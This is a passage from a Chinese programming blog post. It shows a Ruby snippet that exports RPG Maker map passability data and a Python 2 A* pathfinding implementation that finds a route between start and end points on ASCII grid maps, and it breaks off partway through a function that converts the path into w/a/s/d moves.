&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a&nbsp;=&nbsp;$game_player.passable?(j,i,2)?1:0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a&nbsp;+=&nbsp;$game_player.passable?(j,i,4)?2:0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a&nbsp;+=&nbsp;$game_player.passable?(j,i,6)?4:0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a&nbsp;+=&nbsp;&nbsp;$game_player.passable?(j,i,8)?8:0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str&nbsp;&lt;&lt;&nbsp;a
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j&nbsp;+=&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file1.write(str)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i&nbsp;+=&nbsp;1
end</pre><p style="text-align: left;"><span style="background: rgb(217, 217, 217) none repeat scroll 0% 0%; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><br/></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 得到地图信息后,用A*算法求路径。</span></p><pre class="brush:python;toolbar:false">#&nbsp;-*-&nbsp;coding:&nbsp;utf-8&nbsp;-*-
#&nbsp;copy&nbsp;from&nbsp;http://blog.chinaunix.net/uid-20749137-id-718757.html
#&nbsp;modify&nbsp;by&nbsp;pxx
import&nbsp;math
#地图
tm&nbsp;=&nbsp;[
&#39;############################################################&#39;,
&#39;#..........................................................#&#39;,
&#39;#.............................#............................#&#39;,
&#39;#.............................#............................#&#39;,
&#39;#.............................#............................#&#39;,
&#39;#.......S.....................#............................#&#39;,
&#39;#.............................#............................#&#39;,
&#39;#.............................#............................#&#39;,
&#39;#.............................#............................#&#39;,
&#39;#.............................#............................#&#39;,
&#39;#.............................#............................#&#39;,
&#39;#.............................#............................#&#39;,
&#39;#.............................#............................#&#39;,
&#39;#######.#######################################............#&#39;,
&#39;#....#........#............................................#&#39;,
&#39;#....#........#............................................#&#39;,
&#39;#....##########............................................#&#39;,
&#39;#..........................................................#&#39;,
&#39;#..........................................................#&#39;,
&#39;#..........................................................#&#39;,
&#39;#..........................................................#&#39;,
&#39;#..........................................................#&#39;,
&#39;#...............................##############.............#&#39;,
&#39;#...............................#........E...#.............#&#39;,
&#39;#...............................#............#.............#&#39;,
&#39;#...............................#............#.............#&#39;,
&#39;#...............................#............#.............#&#39;,
&#39;#...............................###########..#.............#&#39;,
&#39;#..........................................................#&#39;,
&#39;#..........................................................#&#39;,
&#39;############################################################&#39;]
tm&nbsp;=&nbsp;[
&#39;############################################################&#39;,
&#39;#..........................................................#&#39;,
&#39;#.............................#............................#&#39;,
&#39;#.......S.....................#............................#&#39;,
&#39;#...............................##############.............#&#39;,
&#39;#...............................#........E...#.............#&#39;,
&#39;#...............................#............#.............#&#39;,
&#39;#...............................###########..#.............#&#39;,
&#39;#..........................................................#&#39;,
&#39;############################################################&#39;]
#因为python里string不能直接改变某一元素,所以用test_map来存储搜索时的地图
test_map&nbsp;=&nbsp;[]
#########################################################
class&nbsp;Node_Elem:
&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;开放列表和关闭列表的元素类型,parent用来在成功的时候回溯路径
&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;__init__(self,&nbsp;parent,&nbsp;x,&nbsp;y,&nbsp;dist):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.parent&nbsp;=&nbsp;parent
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.x&nbsp;=&nbsp;x
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.y&nbsp;=&nbsp;y
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.dist&nbsp;=&nbsp;dist
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
class&nbsp;A_Star:
&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;A星算法实现类
&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;#注意w,h两个参数,如果你修改了地图,需要传入一个正确值或者修改这里的默认参数
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;__init__(self,&nbsp;s_x,&nbsp;s_y,&nbsp;e_x,&nbsp;e_y,&nbsp;w=60,&nbsp;h=30):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.s_x&nbsp;=&nbsp;s_x
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.s_y&nbsp;=&nbsp;s_y
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.e_x&nbsp;=&nbsp;e_x
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.e_y&nbsp;=&nbsp;e_y
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.width&nbsp;=&nbsp;w
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.height&nbsp;=&nbsp;h
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.open&nbsp;=&nbsp;[]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.close&nbsp;=&nbsp;[]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.path&nbsp;=&nbsp;[]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;#查找路径的入口函数
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;find_path(self):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#构建开始节点
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p&nbsp;=&nbsp;Node_Elem(None,&nbsp;self.s_x,&nbsp;self.s_y,&nbsp;0.0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;True:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#扩展F值最小的节点
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.extend_round(p)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#如果开放列表为空,则不存在路径,返回
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;self.open:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#获取F值最小的节点
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;idx,&nbsp;p&nbsp;=&nbsp;self.get_best()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#找到路径,生成路径,返回
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;self.is_target(p):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.make_path(p)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#把此节点压入关闭列表,并从开放列表里删除
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.close.append(p)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;del&nbsp;self.open[idx]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;make_path(self,p):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#从结束点回溯到开始点,开始点的parent&nbsp;==&nbsp;None
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;p:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.path.append((p.x,&nbsp;p.y))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p&nbsp;=&nbsp;p.parent
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;is_target(self,&nbsp;i):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;i.x&nbsp;==&nbsp;self.e_x&nbsp;and&nbsp;i.y&nbsp;==&nbsp;self.e_y
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;get_best(self):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;best&nbsp;=&nbsp;None
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bv&nbsp;=&nbsp;100000000&nbsp;#如果你修改的地图很大,可能需要修改这个值
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bi&nbsp;=&nbsp;-1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;idx,&nbsp;i&nbsp;in&nbsp;enumerate(self.open):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value&nbsp;=&nbsp;self.get_dist(i)#获取F值
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;value&nbsp;&lt;&nbsp;bv:#比以前的更好,即F值更小
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;best&nbsp;=&nbsp;i
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bv&nbsp;=&nbsp;value
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bi&nbsp;=&nbsp;idx
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;bi,&nbsp;best
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;get_dist(self,&nbsp;i):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;F&nbsp;=&nbsp;G&nbsp;+&nbsp;H
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;G&nbsp;为已经走过的路径长度,&nbsp;H为估计还要走多远
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;这个公式就是A*算法的精华了。
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;i.dist&nbsp;+&nbsp;math.sqrt(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(self.e_x-i.x)*(self.e_x-i.x)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&nbsp;(self.e_y-i.y)*(self.e_y-i.y))*1.2
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;extend_round(self,&nbsp;p):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#可以从8个方向走
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#xs&nbsp;=&nbsp;(-1,&nbsp;0,&nbsp;1,&nbsp;-1,&nbsp;1,&nbsp;-1,&nbsp;0,&nbsp;1)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#ys&nbsp;=&nbsp;(-1,-1,-1,&nbsp;&nbsp;0,&nbsp;0,&nbsp;&nbsp;1,&nbsp;1,&nbsp;1)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#只能走上下左右四个方向
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xs&nbsp;=&nbsp;(0,&nbsp;-1,&nbsp;1,&nbsp;0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ys&nbsp;=&nbsp;(-1,&nbsp;0,&nbsp;0,&nbsp;1)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;x,&nbsp;y&nbsp;in&nbsp;zip(xs,&nbsp;ys):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;new_x,&nbsp;new_y&nbsp;=&nbsp;x&nbsp;+&nbsp;p.x,&nbsp;y&nbsp;+&nbsp;p.y
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#无效或者不可行走区域,则勿略
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;self.is_valid_coord(new_x,&nbsp;new_y):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#构造新的节点
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;node&nbsp;=&nbsp;Node_Elem(p,&nbsp;new_x,&nbsp;new_y,&nbsp;p.dist+self.get_cost(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.x,&nbsp;p.y,&nbsp;new_x,&nbsp;new_y))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#新节点在关闭列表,则忽略
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;self.node_in_close(node):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i&nbsp;=&nbsp;self.node_in_open(node)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;i&nbsp;!=&nbsp;-1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#新节点在开放列表
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;self.open[i].dist&nbsp;&gt;&nbsp;node.dist:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#现在的路径到比以前到这个节点的路径更好~
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#则使用现在的路径
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.open[i].parent&nbsp;=&nbsp;p
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.open[i].dist&nbsp;=&nbsp;node.dist
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.open.append(node)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;get_cost(self,&nbsp;x1,&nbsp;y1,&nbsp;x2,&nbsp;y2):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上下左右直走,代价为1.0,斜走,代价为1.4
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;x1&nbsp;==&nbsp;x2&nbsp;or&nbsp;y1&nbsp;==&nbsp;y2:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;1.0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;1.4
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;node_in_close(self,&nbsp;node):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;self.close:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;node.x&nbsp;==&nbsp;i.x&nbsp;and&nbsp;node.y&nbsp;==&nbsp;i.y:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;True
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;False
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;node_in_open(self,&nbsp;node):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i,&nbsp;n&nbsp;in&nbsp;enumerate(self.open):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;node.x&nbsp;==&nbsp;n.x&nbsp;and&nbsp;node.y&nbsp;==&nbsp;n.y:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;i
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;is_valid_coord(self,&nbsp;x,&nbsp;y):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;x&nbsp;&lt;&nbsp;0&nbsp;or&nbsp;x&nbsp;&gt;=&nbsp;self.width&nbsp;or&nbsp;y&nbsp;&lt;&nbsp;0&nbsp;or&nbsp;y&nbsp;&gt;=&nbsp;self.height:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;False
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#print&nbsp;y,&nbsp;x,&nbsp;len(test_map)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;test_map[y][x]&nbsp;!=&nbsp;&#39;#&#39;
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;get_searched(self):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;l&nbsp;=&nbsp;[]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;self.open:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;l.append((i.x,&nbsp;i.y))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;self.close:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;l.append((i.x,&nbsp;i.y))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;l
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
#########################################################
def&nbsp;print_test_map():
&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;打印搜索后的地图
&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;line&nbsp;in&nbsp;test_map:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&#39;&#39;.join(line)
def&nbsp;get_start_XY():
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;get_symbol_XY(&#39;S&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;get_end_XY():
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;get_symbol_XY(&#39;E&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;get_symbol_XY(s):
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;y,&nbsp;line&nbsp;in&nbsp;enumerate(test_map):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x&nbsp;=&nbsp;line.index(s)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
&nbsp;&nbsp;&nbsp;&nbsp;#print&nbsp;x,&nbsp;y
&nbsp;&nbsp;&nbsp;&nbsp;#raw_input(&quot;:&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;x,&nbsp;y
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
#########################################################
def&nbsp;mark_path(l):
&nbsp;&nbsp;&nbsp;&nbsp;mark_symbol(l,&nbsp;&#39;*&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;mark_searched(l):
&nbsp;&nbsp;&nbsp;&nbsp;mark_symbol(l,&nbsp;&#39;&nbsp;&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;mark_symbol(l,&nbsp;s):
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;x,&nbsp;y&nbsp;in&nbsp;l:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test_map[y][x]&nbsp;=&nbsp;s
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;mark_start_end(s_x,&nbsp;s_y,&nbsp;e_x,&nbsp;e_y):
&nbsp;&nbsp;&nbsp;&nbsp;test_map[s_y][s_x]&nbsp;=&nbsp;&#39;S&#39;
&nbsp;&nbsp;&nbsp;&nbsp;test_map[e_y][e_x]&nbsp;=&nbsp;&#39;E&#39;
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;tm_to_test_map():
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;list(&quot;nihao&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;raw_input(&quot;:&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;line&nbsp;in&nbsp;tm:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test_map.append(list(line))
&nbsp;&nbsp;&nbsp;&nbsp;#print&nbsp;test_map
&nbsp;&nbsp;&nbsp;&nbsp;raw_input(&quot;:&quot;)
step_map&nbsp;=&nbsp;{(-1,&nbsp;0):&quot;a&quot;,&nbsp;(1,&nbsp;0):&quot;d&quot;,&nbsp;(0,-1):&quot;w&quot;,&nbsp;(0,&nbsp;1):&quot;s&quot;}
def&nbsp;getway(l,&nbsp;start,&nbsp;end):
&nbsp;&nbsp;&nbsp;&nbsp;#print&nbsp;start
